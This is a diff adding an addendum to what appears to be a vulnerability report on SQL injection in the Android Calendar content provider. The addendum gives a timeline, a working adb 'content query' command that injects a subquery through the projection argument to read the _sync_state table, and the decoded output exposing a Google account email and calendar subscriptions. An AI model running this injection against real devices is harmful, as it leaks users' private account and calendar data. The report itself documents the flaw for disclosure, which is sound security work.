@@ -275,3 +275,52 @@ qb.query(db, projection, selection, selectionArgs, ...);
 
 - **2026-09-07:** Vulnerability discovered via ADB shell, proven with PoC app (UID 10361) on Pixel 6a, Android 17 (API 37, security patch 2026-06-05)
 - **2026-09-07:** Second injection vector (projection subquery) confirmed, event data extraction proven
+- **2026-09-07:** Full sync token (JSON) extracted via projection injection — contains Google account email, sync timestamps, and calendar subscription list
+
+### Addendum: Full Sync Token Extraction via Projection Injection
+
+The projection injection provides the most powerful extraction method — data returns directly in query results without UNION or blind techniques.
+
+**Command:**
+```bash
+content query --uri content://com.android.calendar/events \
+  --projection "(SELECT hex(data) FROM _sync_state LIMIT 1) AS sync_data" \
+  --sort "dtstart LIMIT 1"
+```
+
+**Decoded result (hex → ASCII JSON):**
+```json
+{
+  "version": 16,
+  "firstSeen": false,
+  "jellyBeanOrNewer": true,
+  "b38085245": 2147483647,
+  "package": "com.google.android.calendar",
+  "sandiyotest@gmail.com": {
+    "window_end": 1822176000000,
+    "feed_updated_time": "2026-04-14T16:15:22.948Z",
+    "last_sync_time": 1788724078146,
+    "do_incremental_sync": true
+  },
+  "en-gb.indian#holiday@group.v.calendar.google.com": {
+    "window_end": 1822176000000,
+    "feed_updated_time": "2026-08-21T08:38:24.703Z",
+    "last_sync_time": 1788550537668,
+    "do_incremental_sync": true
+  },
+  "en.indian#holiday@group.v.calendar.google.com": {
+    "window_end": 1822176000000,
+    "feed_updated_time": "2026-08-21T08:38:24.703Z",
+    "last_sync_time": 1788550523713,
+    "do_incremental_sync": true
+  }
+}
+```
+
+**Data exposed in sync token:**
+- Google account email identity
+- Calendar subscription list (all subscribed calendars)
+- Exact sync timestamps per calendar (behavioral fingerprinting)
+- Feed update times from Google servers
+- Internal phenotype/flags value (b38085245)
+- Package identity and version metadata
